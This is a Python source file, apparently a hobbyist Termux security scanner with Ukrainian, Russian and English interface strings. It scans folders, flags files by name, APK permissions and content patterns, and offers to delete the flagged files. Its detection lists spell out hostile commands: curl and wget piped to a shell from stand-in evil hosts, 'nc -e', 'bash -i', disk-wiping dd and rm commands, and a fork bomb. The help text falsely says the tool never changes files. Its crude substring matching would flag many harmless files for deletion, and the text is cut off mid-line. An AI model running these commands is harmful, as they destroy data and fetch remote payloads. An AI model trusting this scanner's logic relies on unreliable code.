#!/data/data/com.termux/files/usr/bin/bash
import os
import sys
import time
import subprocess
import json
from datetime import datetime

# ============================================
#   TBFPUMBA-SckanerOp v7.0 (MULTILANG)
#   by TBFPUMBA — Technology. Security. Efficiency.
# ============================================

# Кольорові коди
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Файл для збереження налаштувань
CONFIG_FILE = os.path.expanduser("~/.tbfpumba_config.json")

# ============================================
#   МОВНІ ПАКЕТИ
# ============================================
LANG = {
    "uk": {
        "app_name": "🔥 TBFPUMBA-SckanerOp v7.0 (MULTILANG) 🔥",
        "app_by": "⚡ by TBFPUMBA — Technology. Security. Efficiency. ⚡",
        "loading": "⏳ Ініціалізація сканера...",
        "ready": "✅ Готово!",
        "choose_folder": "📂 Виберіть папку для сканування:",
        "opt_termux": "  1. Termux (за замовчуванням)",
        "opt_phone": "  2. Весь телефон (/storage/emulated/0)",
        "opt_custom": "  3. Ввести свій шлях",
        "enter_choice": "👉 Виберіть (1/2/3): ",
        "enter_path": "📂 Введіть шлях: ",
        "invalid_path": "❌ Шлях не існує! Використовую Termux.",
        "invalid_choice": "⚠️ Невірний вибір. Використовую Termux.",
        "selected": "📂 Обрано: ",
        "scan_confirm": "⚠️ Запустити сканування? (y/n/help/TBF++): ",
        "scan_cancel": "❌ Сканування скасовано.",
        "scanning": "📂 Сканування папки: ",
        "scan_result_title": "🔍 РЕЗУЛЬТАТИ СКАНУВАННЯ",
        "critical_title": "\n🔴🔴🔴 КРИТИЧНІ ЗАГРОЗИ:",
        "suspicious_title": "\n🟡 ПІДОЗРІЛІ ФАЙЛИ:",
        "found": "🔒 Знайдено: {0} підозрілих файлів.",
        "deleted": "✅ Видалено: {0}",
        "delete_fail": "❌ Не вдалося видалити: {0}",
        "delete_confirm": "⚠️ ВИДАЛЕННЯ ЗАГРОЗ! Буде видалено {0} файлів. Впевнені? (y/n): ",
        "delete_cancel": "❌ Видалення скасовано.",
        "no_threats": "✅ Підозрілих файлів не знайдено.",
        "clean": "✅ Підозрілих файлів не знайдено. Ваша система чиста!",
        "scan_done": "⏱️ Час сканування: {0} секунд",
        "delete_hint": "💡 Для видалення всіх загроз введіть: -TBF",
        "lang_choose": "🌍 Оберіть мову / Choose language / Выберите язык:",
        "lang_uk": "  1. Українська",
        "lang_ru": "  2. Русский",
        "lang_en": "  3. English",
        "lang_saved": "✅ Мову збережено! Перезапустіть сканер.",
        "help_title": "📖 TBFPUMBA-SckanerOp — Довідка",
        "help_about": "🛡️  Про програму:",
        "help_about_text": "  Потужний сканер безпеки для виявлення",
        "help_about_text2": "  та ВИДАЛЕННЯ підозрілих та критичних загроз.",
        "help_usage": "🚀  Як запустити:",
        "help_usage_text": "  python tbfpumba_scan.py",
        "help_usage_text2": "  python tbfpumba_scan.py /шлях/до/папки",
        "help_cmds": "⚙️  Команди:",
        "help_cmd_help": "  help   — показати це керівництво",
        "help_cmd_y": "  y      — запустити сканування",
        "help_cmd_tbf": "  TBF++  — змінити мову",
        "help_cmd_n": "  n      — вийти",
        "help_what_scan": "📂  Що сканується:",
        "help_what_scan_text": "  - .txt, .sh, .py, .js, .c, .cpp, .bash, .zsh, .md",
        "help_what_scan_text2": "  - .apk файли (аналіз назви, дозволів, розміру)",
        "help_what_scan_text3": "  - .bin, .exe (за назвою та сигнатурами)",
        "help_levels": "🔴  Рівні загроз:",
        "help_levels_text": "  🔴 Критична — може пошкодити систему",
        "help_levels_text2": "  🟡 Підозріла — потребує перевірки",
        "help_safety": "🔒  Безпека:",
        "help_safety_text": "  Сканер не змінює файли, тільки аналізує.",
        "help_exit": "Натисніть Enter, щоб закрити довідку...",
        "cmd_not_found": "❗ Введіть 'y', 'n', 'help' або 'TBF++'.",
        "unknown_cmd": "❌ Невідома команда. Введіть -TBF або натисніть Enter.",
        "exit_msg": "👋 Дякуємо, що використовуєте TBFPUMBA-SckanerOp!"
    },
    "ru": {
        "app_name": "🔥 TBFPUMBA-SckanerOp v7.0 (MULTILANG) 🔥",
        "app_by": "⚡ by TBFPUMBA — Technology. Security. Efficiency. ⚡",
        "loading": "⏳ Инициализация сканера...",
        "ready": "✅ Готово!",
        "choose_folder": "📂 Выберите папку для сканирования:",
        "opt_termux": "  1. Termux (по умолчанию)",
        "opt_phone": "  2. Весь телефон (/storage/emulated/0)",
        "opt_custom": "  3. Ввести свой путь",
        "enter_choice": "👉 Выберите (1/2/3): ",
        "enter_path": "📂 Введите путь: ",
        "invalid_path": "❌ Путь не существует! Использую Termux.",
        "invalid_choice": "⚠️ Неверный выбор. Использую Termux.",
        "selected": "📂 Выбрано: ",
        "scan_confirm": "⚠️ Запустить сканирование? (y/n/help/TBF++): ",
        "scan_cancel": "❌ Сканирование отменено.",
        "scanning": "📂 Сканирование папки: ",
        "scan_result_title": "🔍 РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ",
        "critical_title": "\n🔴🔴🔴 КРИТИЧЕСКИЕ УГРОЗЫ:",
        "suspicious_title": "\n🟡 ПОДОЗРИТЕЛЬНЫЕ ФАЙЛЫ:",
        "found": "🔒 Найдено: {0} подозрительных файлов.",
        "deleted": "✅ Удалено: {0}",
        "delete_fail": "❌ Не удалось удалить: {0}",
        "delete_confirm": "⚠️ УДАЛЕНИЕ УГРОЗ! Будет удалено {0} файлов. Уверены? (y/n): ",
        "delete_cancel": "❌ Удаление отменено.",
        "no_threats": "✅ Подозрительных файлов не найдено.",
        "clean": "✅ Подозрительных файлов не найдено. Ваша система чиста!",
        "scan_done": "⏱️ Время сканирования: {0} секунд",
        "delete_hint": "💡 Для удаления всех угроз введите: -TBF",
        "lang_choose": "🌍 Выберите язык / Choose language / Оберіть мову:",
        "lang_uk": "  1. Українська",
        "lang_ru": "  2. Русский",
        "lang_en": "  3. English",
        "lang_saved": "✅ Язык сохранен! Перезапустите сканер.",
        "help_title": "📖 TBFPUMBA-SckanerOp — Справка",
        "help_about": "🛡️  О программе:",
        "help_about_text": "  Мощный сканер безопасности для обнаружения",
        "help_about_text2": "  и УДАЛЕНИЯ подозрительных и критических угроз.",
        "help_usage": "🚀  Как запустить:",
        "help_usage_text": "  python tbfpumba_scan.py",
        "help_usage_text2": "  python tbfpumba_scan.py /путь/к/папке",
        "help_cmds": "⚙️  Команды:",
        "help_cmd_help": "  help   — показать это руководство",
        "help_cmd_y": "  y      — запустить сканирование",
        "help_cmd_tbf": "  TBF++  — изменить язык",
        "help_cmd_n": "  n      — выйти",
        "help_what_scan": "📂  Что сканируется:",
        "help_what_scan_text": "  - .txt, .sh, .py, .js, .c, .cpp, .bash, .zsh, .md",
        "help_what_scan_text2": "  - .apk файлы (анализ названия, разрешений, размера)",
        "help_what_scan_text3": "  - .bin, .exe (по названию и сигнатурам)",
        "help_levels": "🔴  Уровни угроз:",
        "help_levels_text": "  🔴 Критическая — может повредить систему",
        "help_levels_text2": "  🟡 Подозрительная — требует проверки",
        "help_safety": "🔒  Безопасность:",
        "help_safety_text": "  Сканер не изменяет файлы, только анализирует.",
        "help_exit": "Нажмите Enter, чтобы закрыть справку...",
        "cmd_not_found": "❗ Введите 'y', 'n', 'help' или 'TBF++'.",
        "unknown_cmd": "❌ Неизвестная команда. Введите -TBF или нажмите Enter.",
        "exit_msg": "👋 Спасибо, что используете TBFPUMBA-SckanerOp!"
    },
    "en": {
        "app_name": "🔥 TBFPUMBA-SckanerOp v7.0 (MULTILANG) 🔥",
        "app_by": "⚡ by TBFPUMBA — Technology. Security. Efficiency. ⚡",
        "loading": "⏳ Initializing scanner...",
        "ready": "✅ Ready!",
        "choose_folder": "📂 Choose folder to scan:",
        "opt_termux": "  1. Termux (default)",
        "opt_phone": "  2. Whole phone (/storage/emulated/0)",
        "opt_custom": "  3. Enter custom path",
        "enter_choice": "👉 Choose (1/2/3): ",
        "enter_path": "📂 Enter path: ",
        "invalid_path": "❌ Path doesn't exist! Using Termux.",
        "invalid_choice": "⚠️ Invalid choice. Using Termux.",
        "selected": "📂 Selected: ",
        "scan_confirm": "⚠️ Start scanning? (y/n/help/TBF++): ",
        "scan_cancel": "❌ Scanning cancelled.",
        "scanning": "📂 Scanning folder: ",
        "scan_result_title": "🔍 SCAN RESULTS",
        "critical_title": "\n🔴🔴🔴 CRITICAL THREATS:",
        "suspicious_title": "\n🟡 SUSPICIOUS FILES:",
        "found": "🔒 Found: {0} suspicious files.",
        "deleted": "✅ Deleted: {0}",
        "delete_fail": "❌ Failed to delete: {0}",
        "delete_confirm": "⚠️ DELETE THREATS! {0} files will be deleted. Are you sure? (y/n): ",
        "delete_cancel": "❌ Deletion cancelled.",
        "no_threats": "✅ No suspicious files found.",
        "clean": "✅ No suspicious files found. Your system is clean!",
        "scan_done": "⏱️ Scan time: {0} seconds",
        "delete_hint": "💡 To delete all threats enter: -TBF",
        "lang_choose": "🌍 Choose language / Оберіть мову / Выберите язык:",
        "lang_uk": "  1. Українська",
        "lang_ru": "  2. Русский",
        "lang_en": "  3. English",
        "lang_saved": "✅ Language saved! Restart the scanner.",
        "help_title": "📖 TBFPUMBA-SckanerOp — Help",
        "help_about": "🛡️  About:",
        "help_about_text": "  Powerful security scanner for detecting",
        "help_about_text2": "  and REMOVING suspicious and critical threats.",
        "help_usage": "🚀  How to run:",
        "help_usage_text": "  python tbfpumba_scan.py",
        "help_usage_text2": "  python tbfpumba_scan.py /path/to/folder",
        "help_cmds": "⚙️  Commands:",
        "help_cmd_help": "  help   — show this help",
        "help_cmd_y": "  y      — start scanning",
        "help_cmd_tbf": "  TBF++  — change language",
        "help_cmd_n": "  n      — exit",
        "help_what_scan": "📂  What is scanned:",
        "help_what_scan_text": "  - .txt, .sh, .py, .js, .c, .cpp, .bash, .zsh, .md",
        "help_what_scan_text2": "  - .apk files (name, permissions, size)",
        "help_what_scan_text3": "  - .bin, .exe (by name and signatures)",
        "help_levels": "🔴  Threat levels:",
        "help_levels_text": "  🔴 Critical — can damage the system",
        "help_levels_text2": "  🟡 Suspicious — requires checking",
        "help_safety": "🔒  Safety:",
        "help_safety_text": "  Scanner does not change files, only analyzes.",
        "help_exit": "Press Enter to close help...",
        "cmd_not_found": "❗ Enter 'y', 'n', 'help' or 'TBF++'.",
        "unknown_cmd": "❌ Unknown command. Enter -TBF or press Enter.",
        "exit_msg": "👋 Thank you for using TBFPUMBA-SckanerOp!"
    }
}

# ============================================
#   ФУНКЦІЇ РОБОТИ З МОВОЮ
# ============================================
def load_lang():
    """Завантажує збережену мову або показує вибір при першому запуску"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                return config.get('lang', 'uk')
        except:
            return 'uk'
    else:
        return choose_language()

def save_lang(lang):
    """Зберігає вибрану мову"""
    with open(CONFIG_FILE, 'w') as f:
        json.dump({'lang': lang}, f)

def choose_language():
    """Показує меню вибору мови"""
    os.system('clear')
    print(f"{CYAN}🌍 {LANG['uk']['lang_choose']}{RESET}")
    print(f"  {GREEN}1. Українська{RESET}")
    print(f"  {GREEN}2. Русский{RESET}")
    print(f"  {GREEN}3. English{RESET}")
    
    choice = input(f"{BLUE}👉 {RESET}").strip()
    
    if choice == '1':
        return 'uk'
    elif choice == '2':
        return 'ru'
    elif choice == '3':
        return 'en'
    else:
        print(f"{YELLOW}⚠️ Невірний вибір. Використовую Українську.{RESET}")
        return 'uk'

def change_language():
    """Змінює мову через команду TBF++"""
    new_lang = choose_language()
    save_lang(new_lang)
    os.system('clear')
    print(f"{GREEN}{LANG[new_lang]['lang_saved']}{RESET}")
    sys.exit(0)

# ============================================
#   ОСНОВНІ ФУНКЦІЇ СКАНЕРА
# ============================================
def rainbow_print(text, lang='uk'):
    os.system(f'echo "{text}" | lolcat 2>/dev/null || echo "{text}"')

def color_print(text, color=WHITE):
    print(f"{color}{text}{RESET}")

def loading_bar(title, lang='uk', duration=0.01):
    print(f"\n{BLUE}⏳ {title}{RESET}")
    for i in range(101):
        time.sleep(duration)
        bar = "█" * (i // 2) + "░" * (50 - i // 2)
        print(f"\r[{bar}] {i}%", end="")
    print(f"\n{GREEN}{LANG[lang]['ready']}{RESET}\n")

def show_help(lang='uk'):
    os.system('clear')
    rainbow_print(LANG[lang]['help_title'], lang)
    rainbow_print("========================================", lang)
    rainbow_print(LANG[lang]['help_about'], lang)
    rainbow_print(f"  {LANG[lang]['help_about_text']}", lang)
    rainbow_print(f"  {LANG[lang]['help_about_text2']}", lang)
    rainbow_print("")
    rainbow_print(LANG[lang]['help_usage'], lang)
    rainbow_print(f"  {LANG[lang]['help_usage_text']}", lang)
    rainbow_print(f"  {LANG[lang]['help_usage_text2']}", lang)
    rainbow_print("")
    rainbow_print(LANG[lang]['help_cmds'], lang)
    rainbow_print(f"  {LANG[lang]['help_cmd_help']}", lang)
    rainbow_print(f"  {LANG[lang]['help_cmd_y']}", lang)
    rainbow_print(f"  {LANG[lang]['help_cmd_tbf']}", lang)
    rainbow_print(f"  {LANG[lang]['help_cmd_n']}", lang)
    rainbow_print("")
    rainbow_print(LANG[lang]['help_what_scan'], lang)
    rainbow_print(f"  {LANG[lang]['help_what_scan_text']}", lang)
    rainbow_print(f"  {LANG[lang]['help_what_scan_text2']}", lang)
    rainbow_print(f"  {LANG[lang]['help_what_scan_text3']}", lang)
    rainbow_print("")
    rainbow_print(LANG[lang]['help_levels'], lang)
    rainbow_print(f"  {LANG[lang]['help_levels_text']}", lang)
    rainbow_print(f"  {LANG[lang]['help_levels_text2']}", lang)
    rainbow_print("")
    rainbow_print(LANG[lang]['help_safety'], lang)
    rainbow_print(f"  {LANG[lang]['help_safety_text']}", lang)
    rainbow_print("========================================")
    input(f"\n{LANG[lang]['help_exit']}")

def delete_threats(threats, lang='uk'):
    if not threats:
        rainbow_print(f"\n{LANG[lang]['no_threats']}", lang)
        return
    
    print(f"\n{RED}{LANG[lang]['delete_confirm'].format(len(threats))}{RESET}")
    answer = input(f"{RED} (y/n): {RESET}").lower()
    
    if answer in ['y', 'yes']:
        deleted = 0
        for filepath, level, msg in threats:
            try:
                os.remove(filepath)
                print(f"{GREEN}{LANG[lang]['deleted'].format(filepath)}{RESET}")
                deleted += 1
            except Exception as e:
                print(f"{RED}{LANG[lang]['delete_fail'].format(filepath)} ({e}){RESET}")
        rainbow_print(f"\n🔒 {LANG[lang]['deleted'].format(deleted)}", lang)
    else:
        rainbow_print(f"\n{LANG[lang]['delete_cancel']}", lang)

def choose_folder(lang='uk'):
    print(f"\n{LANG[lang]['choose_folder']}")
    print(f"  {LANG[lang]['opt_termux']}")
    print(f"  {LANG[lang]['opt_phone']}")
    print(f"  {LANG[lang]['opt_custom']}")
    
    choice = input(f"\n{LANG[lang]['enter_choice']}").strip()
    
    if choice == "1":
        return os.path.expanduser("~")
    elif choice == "2":
        return "/storage/emulated/0"
    elif choice == "3":
        custom_path = input(f"{LANG[lang]['enter_path']}").strip()
        if os.path.exists(custom_path):
            return custom_path
        else:
            print(f"{RED}{LANG[lang]['invalid_path']}{RESET}")
            return os.path.expanduser("~")
    else:
        print(f"{YELLOW}{LANG[lang]['invalid_choice']}{RESET}")
        return os.path.expanduser("~")

def check_file_by_name(filepath):
    filename = os.path.basename(filepath).lower()
    suspicious_patterns = [
        "hack", "crack", "cheat", "mod", "unlock", "premium", "pro",
        "crypto", "miner", "steal", "fake", "clone", "spy", "track",
        "exploit", "payload", "backdoor", "trojan", "ransomware",
        "keylogger", "rootkit", "virus", "malware"
    ]
    for pattern in suspicious_patterns:
        if pattern in filename:
            return f"🟡 Підозріла назва: {pattern}"
    return None

def check_apk(filepath):
    results = []
    filename = os.path.basename(filepath).lower()
    size = os.path.getsize(filepath) // (1024 * 1024)
    
    suspicious_patterns = [
        "hack", "crack", "cheat", "mod", "unlock", "premium", "pro",
        "crypto", "miner", "steal", "fake", "clone", "spy", "track",
        "exploit", "payload", "backdoor", "trojan", "ransomware",
        "keylogger", "rootkit", "virus", "malware"
    ]
    
    for pattern in suspicious_patterns:
        if pattern in filename:
            results.append(("🟡", f"Підозріла назва APK: {pattern}"))
            break
    
    if size < 0.5:
        results.append(("🟡", f"APK занадто малий: {size} МБ"))
    elif size > 100:
        results.append(("🟡", f"APK занадто великий: {size} МБ"))
    
    suspicious_permissions = [
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECORD_AUDIO",
        "android.permission.CAMERA",
        "android.permission.READ_CONTACTS",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.READ_PHONE_STATE",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION"
    ]
    
    try:
        aapt_check = subprocess.getoutput("which aapt")
        if aapt_check:
            cmd = f"aapt dump permissions {filepath} 2>/dev/null"
            output = subprocess.getoutput(cmd)
            for perm in suspicious_permissions:
                if perm in output:
                    results.append(("🟡", f"Підозрілий дозвіл: {perm}"))
    except:
        pass
    
    return results

def scan_file_content(filepath):
    suspicious_patterns = [
        "rm -rf", "format", "delete_all", "malware", "virus",
        "backdoor", "trojan", "rootkit", "keylogger", "ransomware",
        "cryptominer", "exploit", "payload", "shellcode", "reverse shell",
        "nc -e", "bash -i", "python -c", "perl -e", "curl.*|sh",
        "wget.*|bash", "eval", "exec", "system", "popen", "subprocess",
        "os.system", "os.popen", "subprocess.Popen", "subprocess.call",
        "open('", "read('", "write('", "chmod", "chown", "mount", "umount"
    ]
    
    high_risk_patterns = [
        "rm -rf --no-preserve-root",
        "dd if=/dev/zero of=/dev/block",
        "mkfs.ext4 /dev/block",
        "chmod 777 /system",
        "mount -o rw,remount /system",
        "curl http://malicious-site.com/install.sh | bash",
        "wget https://evil-domain.com/payload.sh | sh",
        "base64 -d | sh",
        "eval $(cat /dev/urandom | base64)",
        "iptables -F",
        "iptables -X",
        "killall -9",
        "pkill -f",
        ":(){ :|:& };:",
        "sudo rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "echo 'nameserver 8.8.8.8' > /etc/resolv.conf"
    ]
    
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            for pattern in high_risk_patterns:
                if pattern in content:
                    return "🔴", pattern
            for pattern in suspicious_patterns:
                if pattern in content:
                    return "🟡", pattern
    except Exception:
        pass
    return None, None

def scan_file(filepath):
    results = []
    name_check = check_file_by_name(filepath)
    if name_check:
        results.append(("🟡", name_check))
    level, pattern = scan_file_content(filepath)
    if level:
        results.appen
